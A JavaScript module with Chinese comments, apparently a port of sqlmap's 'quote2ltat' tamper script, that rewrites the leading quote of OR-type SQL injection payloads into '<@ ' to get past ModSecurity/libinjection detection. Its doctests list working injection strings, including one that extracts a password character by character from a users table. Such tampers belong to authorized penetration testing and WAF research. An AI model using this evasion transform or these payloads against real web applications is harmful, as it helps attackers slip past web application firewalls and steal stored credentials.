// 对标 sqlmap quote2ltat.py：开头 '< quote + OR/||' 改写为 '<@ '
// ModSecurity/libinjection 将 '<@' 视为无害标签开头；仅处理 OR 之后的 payload
// （NULL AND <cond> 为 NULL，会静默破坏 AND 型 payload，故不处理 AND）
export const quote2ltat = {
  name: 'quote2ltat',
  description: "将开头 '< quote OR' 改写为 '<@（libinjection 标签指纹消除，仅 OR/|| 型）",
  doctests: [
    { input: "' OR 1=1-- -", output: "'<@ OR 1=1-- -" },
    { input: "' OR LEFT((SELECT pw FROM users LIMIT 1),1)=0x73-- -", output: "'<@ OR LEFT((SELECT pw FROM users LIMIT 1),1)=0x73-- -" },
    { input: "' AND 1=1-- -", output: "' AND 1=1-- -" }, // AND 型不处理
    { input: '-1 OR 1=1-- -', output: '-1 OR 1=1-- -' }, // 非引号开头不处理
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return String(payload ?? '').replace(/^'\s*(?=(?:OR|\|\|)\b)/i, "'<@ ");
  },
};
export default quote2ltat;
